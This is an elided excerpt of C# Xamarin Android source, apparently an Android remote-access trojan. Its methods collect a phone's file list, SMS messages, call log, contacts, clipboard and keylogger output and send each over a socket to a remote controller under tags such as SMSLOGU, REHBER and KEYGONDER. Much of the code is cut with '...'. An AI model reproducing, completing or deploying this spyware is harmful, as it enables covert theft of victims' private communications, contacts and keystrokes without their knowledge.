...
namespace Task2
{
    //[IntentFilter(new string[] {Intent.ActionMain},
      //  Categories = new string[] { Intent.CategoryLeanbackLauncher })]
    ...
    public class MainActivity : Activity
	{
        ...
        public void sonAsama()
        {
            ...
            PictureCallback.Send(Soketimiz, System.Text.Encoding.UTF8.GetBytes("FILES|" + dosyalarS), 0,
                   System.Text.Encoding.UTF8.GetBytes("FILES|" + dosyalarS).Length, 59999);
        }
        ...
        public void smsLogu(string nereden)
        {
            ...
            byte[] isim_bytlari = System.Text.Encoding.UTF8.GetBytes("SMSLOGU|" + gidecek_veriler);
        ...
        public void telefonLogu()
        {
            ...
            byte[] isim_bytlari = System.Text.Encoding.UTF8.GetBytes("CAGRIKAYITLARI|" + gidecek_veriler);
            PictureCallback.Send(Soketimiz, isim_bytlari, 0, isim_bytlari.Length, 59999);
        }
        public void rehberLogu()
        {
            ...
            byte[] isim_bytlari = System.Text.Encoding.UTF8.GetBytes("REHBER|" + gidecek_veriler);
            PictureCallback.Send(Soketimiz, isim_bytlari, 0, isim_bytlari.Length, 59999);
        }
                        ...
                        case "LOGLARIHAZIRLA":
                           log_dosylari_gonder = "";
                            ...
                            if (fileInfos.Length > 0)
                            {
                              ...
                              byte[] gonder = System.Text.Encoding.UTF8.GetBytes("LOGDOSYA|" + log_dosylari_gonder);
                            ...
                            break;
                        case "KEYCEK":
                            byte[] log = System.Text.Encoding.UTF8.GetBytes("KEYGONDER|" + File.ReadAllText(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly/" + ayirici[1]).Replace(
        ...
        public async void panoyuYolla()
        {
            ...
            byte[] pala = System.Text.Encoding.UTF8.GetBytes("PANOGELDI|" + pano);
